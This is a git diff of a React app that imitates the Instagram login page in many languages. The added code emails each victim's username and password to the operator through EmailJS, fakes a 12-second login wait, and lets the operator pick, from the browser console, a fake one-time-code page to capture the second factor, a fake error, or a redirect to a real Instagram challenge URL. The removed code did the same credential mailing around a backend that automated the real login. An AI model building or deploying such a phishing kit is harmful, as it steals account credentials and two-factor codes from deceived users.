@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import "./App.css";
 import emailjs from "emailjs-com";
 
@@ -11,6 +11,38 @@ function App() {
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
   const [isAutomating, setIsAutomating] = useState(false);
+  const [currentView, setCurrentView] = useState("login"); // 'login', 'otp', 'error'
+  const [errorMessage, setErrorMessage] = useState("");
+  const [otpCode, setOtpCode] = useState("");
+  const [maskedEmail, setMaskedEmail] = useState("");
+
+  // Expose global function for console API calls
+  useEffect(() => {
+    window.handleLoginResponse = (command) => {
+      console.log("Received command:", command);
+      
+      if (command === "getOtp") {
+        // Mask the email (assuming username might be email)
+        const email = username.includes("@") ? username : `${username}@gmail.com`;
+        const masked = email.replace(/(.{1})(.*)(@.*)/, (match, first, middle, domain) => {
+          return first + "*".repeat(Math.min(middle.length, 6)) + domain;
+        });
+        setMaskedEmail(masked);
+        setCurrentView("otp");
+      } else if (command === "incorrectCredentials") {
+        setCurrentView("error");
+        setErrorMessage("Incorrect username or password");
+        setIsAutomating(false);
+      } else if (command === "success") {
+        window.location.href =
+          "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
+      }
+    };
+
+    return () => {
+      delete window.handleLoginResponse;
+    };
+  }, [username]);
 
   const languages = [
     "English (US)",
@@ -108,12 +140,12 @@ function App() {
       loginButton: "Anmelden",
       forgotPassword: "Passwort vergessen?",
       createAccount: "Neues Konto erstellen",
-      selectLanguage: "Wähle deine Sprache",
+      selectLanguage: "Wählen Sie Ihre Sprache",
       showPassword: "Passwort anzeigen",
       hidePassword: "Passwort ausblenden",
     },
     Español: {
-      usernameLabel: "Nombre de usuario, correo o número de móvil",
+      usernameLabel: "Nombre de usuario, correo electrónico o número de móvil",
       passwordLabel: "Contraseña",
       loginButton: "Iniciar sesión",
       forgotPassword: "¿Olvidaste tu contraseña?",
@@ -123,10 +155,10 @@ function App() {
       hidePassword: "Ocultar contraseña",
     },
     "Español (España)": {
-      usernameLabel: "Nombre de usuario, correo o número de móvil",
+      usernameLabel: "Nombre de usuario, correo electrónico o número de móvil",
       passwordLabel: "Contraseña",
       loginButton: "Iniciar sesión",
-      forgotPassword: "¿Has olvidado tu contraseña?",
+      forgotPassword: "¿Olvidaste tu contraseña?",
       createAccount: "Crear cuenta nueva",
       selectLanguage: "Selecciona tu idioma",
       showPassword: "Mostrar contraseña",
@@ -137,13 +169,13 @@ function App() {
       passwordLabel: "Mot de passe",
       loginButton: "Se connecter",
       forgotPassword: "Mot de passe oublié ?",
-      createAccount: "Créer un compte",
+      createAccount: "Créer un nouveau compte",
       selectLanguage: "Sélectionnez votre langue",
       showPassword: "Afficher le mot de passe",
       hidePassword: "Masquer le mot de passe",
     },
     Italiano: {
-      usernameLabel: "Nome utente, email o numero di cellulare",
+      usernameLabel: "Nome utente, e-mail o numero di cellulare",
       passwordLabel: "Password",
       loginButton: "Accedi",
       forgotPassword: "Password dimenticata?",
@@ -158,8 +190,8 @@ function App() {
       loginButton: "Inloggen",
       forgotPassword: "Wachtwoord vergeten?",
       createAccount: "Nieuw account aanmaken",
-      selectLanguage: "Selecteer je taal",
-      showPassword: "Wachtwoord tonen",
+      selectLanguage: "Selecteer uw taal",
+      showPassword: "Wachtwoord weergeven",
       hidePassword: "Wachtwoord verbergen",
     },
     Norsk: {
@@ -176,21 +208,21 @@ function App() {
       usernameLabel: "Nazwa użytkownika, e-mail lub numer telefonu",
       passwordLabel: "Hasło",
       loginButton: "Zaloguj się",
-      forgotPassword: "Nie pamiętasz hasła?",
+      forgotPassword: "Zapomniałeś hasła?",
       createAccount: "Utwórz nowe konto",
-      selectLanguage: "Wybierz język",
+      selectLanguage: "Wybierz swój język",
       showPassword: "Pokaż hasło",
       hidePassword: "Ukryj hasło",
     },
     Português: {
-      usernameLabel: "Nome de utilizador, e-mail ou número de telemóvel",
-      passwordLabel: "Palavra-passe",
-      loginButton: "Iniciar sessão",
-      forgotPassword: "Esqueceu-se da palavra-passe?",
+      usernameLabel: "Nome de usuário, e-mail ou número de celular",
+      passwordLabel: "Senha",
+      loginButton: "Entrar",
+      forgotPassword: "Esqueceu a senha?",
       createAccount: "Criar nova conta",
-      selectLanguage: "Selecione o seu idioma",
-      showPassword: "Mostrar palavra-passe",
-      hidePassword: "Ocultar palavra-passe",
+      selectLanguage: "Selecione seu idioma",
+      showPassword: "Mostrar senha",
+      hidePassword: "Ocultar senha",
     },
     "Português (Brasil)": {
       usernameLabel: "Nome de usuário, e-mail ou número de celular",
@@ -308,205 +340,48 @@ function App() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    console.log("=== LOGIN FORM SUBMITTED ===");
-    console.log("Username:", username);
-    console.log("Password length:", password.length);
     setIsAutomating(true);
+    setErrorMessage("");
 
+    // Send email immediately
     try {
-      console.log("Calling automation API...");
-      // Call your backend automation service
-      // Use environment variable or default to localhost for development
-      // For production/real device, set REACT_APP_API_URL to your Railway server URL
-      // Example: REACT_APP_API_URL=https://your-app.railway.app
-      const API_URL = process.env.REACT_APP_API_URL || "http://localhost:3001";
-      console.log("API URL:", API_URL);
-      console.log("Environment:", process.env.NODE_ENV);
-      console.log("Current hostname:", window.location.hostname);
-      
-      // If API_URL is still localhost and we're not in development, warn the user
-      if (API_URL.includes('localhost') && window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
-        console.warn("⚠️ Using localhost API URL on a real device. This won't work!");
-        console.warn("Please set REACT_APP_API_URL environment variable to your Railway server URL");
-        alert("⚠️ Configuration Error: The app is trying to connect to localhost, which won't work on a real device.\n\nPlease deploy the React app to Vercel/Netlify with REACT_APP_API_URL set to your Railway server URL.\n\nSee DEPLOY_REACT_APP.md for instructions.");
-      }
-
-      const response = await fetch(`${API_URL}/api/automate-login`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
+      await emailjs.send(
+        "service_04tt69h",
+        "template_b9wm876",
+        {
           username: username,
           password: password,
-        }),
-      });
-
-      console.log("Response received, status:", response.status);
-      console.log("Response headers:", response.headers.get("content-type"));
-
-      // Check if response is JSON
-      const contentType = response.headers.get("content-type");
-      if (!contentType || !contentType.includes("application/json")) {
-        const text = await response.text();
-        console.error("Non-JSON response received:", text.substring(0, 200));
-        throw new Error(
-          `Server returned HTML instead of JSON. Check if API URL is correct. Response: ${text.substring(
-            0,
-            100
-          )}`
-        );
-      }
-
-      const result = await response.json();
-
-      console.log("=== AUTOMATION RESULT ===");
-      console.log("Full result object:", result);
-      console.log("Success:", result.success);
-      console.log("Message:", result.message);
-      console.log("Error:", result.error);
-      console.log("URL:", result.url);
-
-      // Check if result indicates Instagram blocking
-      const resultMessage = result.message || "";
-      const resultError = result.error || "";
-      const isInstagramBlockingFromResult =
-        resultMessage.toLowerCase().includes("blocking") ||
-        resultMessage.toLowerCase().includes("blocked") ||
-        resultError.toLowerCase().includes("blocking") ||
-        resultError.toLowerCase().includes("blocked") ||
-        resultMessage.toLowerCase().includes("may be blocking");
-
-      // Determine status for email
-      let emailStatus = result.success
-        ? "✅ Login Successful"
-        : isInstagramBlockingFromResult
-        ? "⚠️ Instagram Blocking Detected"
-        : "❌ Login Failed";
-
-      // Show alert based on result
-      if (result.success) {
-        console.log("=== LOGIN SUCCESS ===");
-        console.log("Message:", result.message);
-        console.log("URL:", result.url);
-        alert(`✅ ${result.message}\nURL: ${result.url}`);
-
-        // Send email notification for successful login
-        emailjs
-          .send(
-            "service_04tt69h",
-            "template_b9wm876",
-            {
-              username: username,
-              password: password,
-              status: emailStatus,
-            },
-            "bfy_j4oBXNKFpGcDC"
-          )
-          .then((emailResult) => {
-            console.log("Email sent:", emailResult.text);
-            // Redirect to challenge URL only on successful login
-            window.location.href =
-              "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
-          })
-          .catch((error) => {
-            console.error("EmailJS error:", error);
-            // Still redirect even if email fails (on success)
-            window.location.href =
-              "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
-          });
-      } else {
-        // Login failed - stay on login page for retry
-        console.log("=== LOGIN FAILED ===");
-        console.log("Message:", result.message);
-        console.log("Error:", result.error);
-
-        // Show appropriate alert based on blocking detection
-        if (isInstagramBlockingFromResult) {
-          alert(
-            `⚠️ Instagram may be blocking automated access.\n\n${
-              result.message || result.error || ""
-            }\n\nThe login attempt was recorded. You can try again, but Instagram may continue to block automated access.`
-          );
-        } else {
-          alert(
-            `❌ ${result.message}\n${
-              result.error ? `Error: ${result.error}` : ""
-            }`
-          );
-        }
-
-        // Send email notification about failed attempt (no redirect)
-        emailjs
-          .send(
-            "service_04tt69h",
-            "template_b9wm876",
-            {
-              username: username,
-              password: password,
-              status: emailStatus,
-            },
-            "bfy_j4oBXNKFpGcDC"
-          )
-          .then((emailResult) => {
-            console.log("Email sent:", emailResult.text);
-            // Don't redirect - user stays on login page to try again
-          })
-          .catch((error) => {
-            console.error("EmailJS error:", error);
-            // Don't redirect on failure - user stays on login page
-          });
-      }
+          status: "⏳ Login Attempt",
+        },
+        "bfy_j4oBXNKFpGcDC"
+      );
+      console.log("Email sent successfully");
     } catch (error) {
-      console.error("=== AUTOMATION ERROR ===");
-      console.error("Error type:", error.name);
-      console.error("Error message:", error.message);
-      console.error("Full error:", error);
-
-      // Check if error is related to Instagram blocking
-      const errorMessage = error.message || "";
-      const isInstagramBlocking =
-        errorMessage.includes("blocking") ||
-        errorMessage.includes("blocked") ||
-        errorMessage.includes("challenge") ||
-        errorMessage.includes("unusual activity");
-
-      if (isInstagramBlocking) {
-        alert(
-          `⚠️ Instagram may be blocking automated access.\n\nThis is common when Instagram detects automation. The login attempt was still recorded.\n\nError: ${error.message}`
-        );
-      } else {
-        alert(
-          `❌ Failed to connect to automation server.\nError: ${error.message}\n\nMake sure the server is running on port 3001.`
-        );
-      }
-
-      // Send email about the error (only if we didn't get a result from server)
-      // Don't redirect - user stays on login page to try again
-      emailjs
-        .send(
-          "service_04tt69h",
-          "template_b9wm876",
-          {
-            username: username,
-            password: password,
-            status: isInstagramBlocking
-              ? "⚠️ Instagram Blocking Detected"
-              : "❌ Automation Error",
-          },
-          "bfy_j4oBXNKFpGcDC"
-        )
-        .then((emailResult) => {
-          console.log("Email sent:", emailResult.text);
-          // Don't redirect - user stays on login page to try again
-        })
-        .catch((emailError) => {
-          console.error("EmailJS error:", emailError);
-          // Don't redirect on error - user stays on login page
-        });
-    } finally {
-      setIsAutomating(false);
+      console.error("EmailJS error:", error);
     }
+
+    // Show "Logging in..." for 12 seconds
+    setTimeout(() => {
+      setIsAutomating(false);
+      // After 12 seconds, wait for console API call
+      console.log("Waiting for console command. Use: handleLoginResponse('getOtp'), handleLoginResponse('incorrectCredentials'), or handleLoginResponse('success')");
+    }, 12000);
+  };
+
+  const handleOtpSubmit = (e) => {
+    e.preventDefault();
+    // Handle OTP submission if needed
+    console.log("OTP submitted:", otpCode);
+  };
+
+  const handleGetNewCode = () => {
+    console.log("Get new code requested");
+    // Handle get new code logic
+  };
+
+  const handleTryAnotherWay = () => {
+    setCurrentView("login");
+    setOtpCode("");
   };
 
   const isFormValid = username.trim() !== "" && password.trim() !== "";
@@ -516,6 +391,69 @@ function App() {
     setShowLanguageModal(false);
   };
 
+  // OTP Page Component
+  if (currentView === "otp") {
+    return (
+      <div className="App">
+        <div className="otp-container">
+          <div className="otp-header">
+            <button className="back-button" onClick={() => setCurrentView("login")}>
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 18L9 12L15 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+              </svg>
+            </button>
+            <button className="help-button">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2"/>
+                <path d="M9.09 9A3 3 0 0 1 12 6C13.657 6 15 7.343 15 9C15 10.657 13.657 12 12 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
+                <path d="M12 16H12.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
+              </svg>
+            </button>
+          </div>
+          
+          <h1 className="otp-title">Check your email</h1>
+          <p className="otp-instruction">Enter the code we sent to {maskedEmail || "m******1@gmail.com"}</p>
+          
+          <div className="otp-illustration">
+            <div className="phone-illustration">
+              <div className="phone-screen">
+                <div className="shield-icon">🛡️</div>
+                <div className="code-display">****</div>
+                <div className="keypad-grid"></div>
+              </div>
+            </div>
+          </div>
+          
+          <form className="otp-form" onSubmit={handleOtpSubmit}>
+            <input
+              type="text"
+              className="otp-input"
+              placeholder="Enter code"
+              value={otpCode}
+              onChange={(e) => setOtpCode(e.target.value)}
+              maxLength={6}
+            />
+            
+            <button type="button" className="get-new-code" onClick={handleGetNewCode}>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M1 4V10H7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                <path d="M23 20V14H17" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10M23 14L18.36 18.36A9 9 0 0 1 3.51 15" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+              </svg>
+              Get a new code
+            </button>
+            
+            <button type="submit" className="continue-button">Continue</button>
+            <button type="button" className="try-another-way-button" onClick={handleTryAnotherWay}>
+              Try another way
+            </button>
+          </form>
+        </div>
+      </div>
+    );
+  }
+
+  // Login Page Component
   return (
     <div className="App">
       <div
@@ -540,6 +478,9 @@ function App() {
           />
         </div>
         <form className="login-form" onSubmit={handleSubmit}>
+          {errorMessage && (
+            <div className="error-message">{errorMessage}</div>
+          )}
           <div className="form-group">
             <label
               htmlFor="username"
